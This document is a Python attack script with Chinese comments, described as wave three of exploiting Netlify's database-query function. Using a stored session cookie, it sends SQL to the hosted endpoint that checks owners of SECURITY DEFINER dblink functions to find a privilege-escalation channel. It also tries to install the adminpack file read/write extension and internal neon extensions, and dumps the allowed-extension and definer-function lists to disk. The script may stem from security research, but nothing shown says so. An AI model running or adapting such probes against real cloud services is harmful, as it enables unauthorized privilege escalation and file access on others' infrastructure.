# -*- coding: utf-8 -*-
"""Netlify database-query 特性利用波3:prosecdef owner 判定 + adminpack/neon/neon_utils 安装与函数清单
"""
import http.client, ssl, gzip, brotli, json, sys, os
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()


def req(body, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw


def run(tag, sql, out_file=None, cut=800):
    try:
        s, raw = req({'siteId': SITE_ID, 'action': 'query', 'sql': sql})
        txt = raw.decode('utf-8', 'ignore').replace('\n', ' ')
        if out_file:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), out_file), 'w', encoding='utf-8') as f:
                f.write(txt)
            print('%-24s [%d] saved -> %s' % (tag, s, out_file))
        else:
            print('%-24s [%d] %s' % (tag, s, txt[:cut]))
    except Exception as e:
        print('%-24s ERR %s' % (tag, str(e)[:80]))


# T1: prosecdef owner 判定(决定是否提权通道)
run('T1_owner_of_prosecdef', "select p.proname, p.proowner::regrole, p.prosecdef, p.proacl from pg_proc p where p.proname in ('dblink_connect','dblink_connect_u')")
# T2: adminpack 安装(文件读写扩展)
run('T2_create_adminpack', "create extension if not exists adminpack")
# T3: neon 内部扩展安装
run('T3_create_neon', "create extension if not exists neon")
# T4: neon_utils 内部扩展安装
run('T4_create_neon_utils', "create extension if not exists neon_utils")
# T5: 完整 allowed_extensions 落盘
run('T5_full_allowed_ext', "select setting from pg_settings where name = 'neon.allowed_extensions'", out_file='_neon_allowed_ext.txt')
# T6: 所有 prosecdef 函数 + owner(全库,落盘分析)
run('T6_all_prosecdef', "select p.proname, p.proowner::regrole, n.nspname from pg_proc p join pg_namespace n on n.oid = p.pronamespace where p.prosecdef order by p.proowner::regrole", out_file='_neon_prosecdef.txt')
